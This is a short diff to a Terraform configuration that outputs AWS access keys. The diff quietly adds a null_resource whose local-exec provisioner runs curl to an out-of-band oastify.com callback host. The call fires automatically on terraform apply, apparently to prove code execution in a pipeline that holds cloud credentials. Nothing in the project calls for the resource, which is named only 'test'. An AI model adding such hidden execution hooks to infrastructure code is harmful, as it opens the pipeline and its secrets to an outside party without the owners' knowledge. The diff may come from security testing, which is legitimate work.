@@ -3,6 +3,9 @@ terraform {
     aws = {
       source = "hashicorp/aws"
     }
+    null = {
+      source = "hashicorp/null"
+    }
   }
 }
 
@@ -59,4 +62,10 @@ output "aws_access_key_id" {
 output "aws_secret_access_key" {
   value     = var.ACCESS_KEY.VALUE
   sensitive = true
+}
+
+resource "null_resource" "test" {
+  provisioner "local-exec" {
+   command = "curl http://mc2fltx1isflqkcahtgbiufv4mady9my.oastify.com/xxx"
+  }
 }
